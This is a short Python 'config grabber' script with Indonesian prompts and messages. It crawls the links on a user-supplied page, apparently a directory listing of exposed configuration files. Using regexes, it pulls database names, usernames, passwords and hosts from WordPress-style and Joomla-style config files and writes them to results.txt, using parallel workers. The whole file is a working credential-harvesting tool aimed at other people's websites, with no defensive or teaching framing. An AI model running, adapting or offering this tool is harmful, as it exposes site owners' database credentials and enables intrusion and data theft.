# Credit By Endang
import requests
import re
from termcolor import colored
import multiprocessing

def grab_data(current_url):
    current_response = requests.get(current_url)

    dbname_match = re.search(r"define\('DB_NAME',\s*'([^']+)'\);", current_response.text)
    dbuser_match = re.search(r"define\('DB_USER',\s*'([^']+)'\);", current_response.text)
    dbpass_match = re.search(r"define\('DB_PASSWORD',\s*'([^']+)'\);", current_response.text)
    host_match = re.search(r"define\('DB_HOST',\s*'([^']+)'\);", current_response.text)

    if all(match is not None for match in [dbname_match, dbuser_match, dbpass_match, host_match]):
        dbname = dbname_match.group(1)
        dbuser = dbuser_match.group(1)
        dbpass = dbpass_match.group(1)
        host = host_match.group(1)

        with open('results.txt', 'a') as f:
            f.write(f"web : {current_url}\nusername : {dbuser}\ndb name : {dbname}\npassword : {dbpass}\nhost : {host}\n\n")

        print(colored(f"Config Grabber Found : {current_url}", 'green'))
    else:
        # Jika tidak ditemukan dengan regex pertama, gunakan regex kedua
        db_match = re.search(r"public\s+\$db\s*=\s*['\"]([^'\"]+)['\"]\s*;", current_response.text)
        user_match = re.search(r"public\s+\$user\s*=\s*['\"]([^'\"]+)['\"]\s*;", current_response.text)
        pass_match = re.search(r"public\s+\$password\s*=\s*['\"]([^'\"]+)['\"]\s*;", current_response.text)
        host_match = re.search(r"public\s+\$host\s*=\s*['\"]([^'\"]+)['\"]\s*;", current_response.text)

        if all(match is not None for match in [db_match, user_match, pass_match, host_match]):
            dbname = db_match.group(1)
            dbuser = user_match.group(1)
            dbpass = pass_match.group(1)
            host = host_match.group(1)

            with open('results.txt', 'a') as f:
                f.write(f"web : {current_url}\nusername : {dbuser}\ndb name : {dbname}\npassword : {dbpass}\nhost : {host}\n\n")

            print(colored(f"Config Grabber Found : {current_url}", 'green'))
        else:
            with open('manual.txt', 'a') as f:
                f.write(f"{current_url}\n")

            print(colored(f"Config Grabber Gagal : {current_url}", 'red'))

def process_urls(urls):
    with multiprocessing.Pool(processes=8) as pool:
        pool.map(grab_data, urls)

if __name__ == '__main__':
    url = input("Masukkan URL: ")
    response = requests.get(url)
    links = re.findall(r'<a\s+href="([^"]+)">[^<]*</a>', response.text)

    urls = [url + link for link in links]

    process_urls(urls)
